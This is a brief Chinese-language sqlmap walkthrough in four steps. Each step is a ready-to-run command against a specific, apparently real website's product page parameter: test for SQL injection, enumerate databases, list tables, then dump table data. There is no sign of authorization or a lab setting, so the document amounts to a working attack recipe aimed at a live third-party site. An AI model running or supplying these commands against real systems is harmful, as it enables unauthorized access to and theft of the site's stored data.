# Sqlmap
1. 测试接口是否存在Sql注入风险
```shell
sqlmap -u "https://ptrl.com.hk/big5/product_details.php?id=66"
```
2. 获取数据库名
```shell
sqlmap -u "https://ptrl.com.hk/big5/product_details.php?id=66" --dbs
```
3. 获取数据库中表信息
```shell
sqlmap -u "https://ptrl.com.hk/big5/product_details.php?id=66" -D $database_name --tables
```
4. 获取表的dump数据
```shell
sqlmap -u "https://ptrl.com.hk/big5/product_details.php?id=66" -D $database_name -T $table_name --dump
```
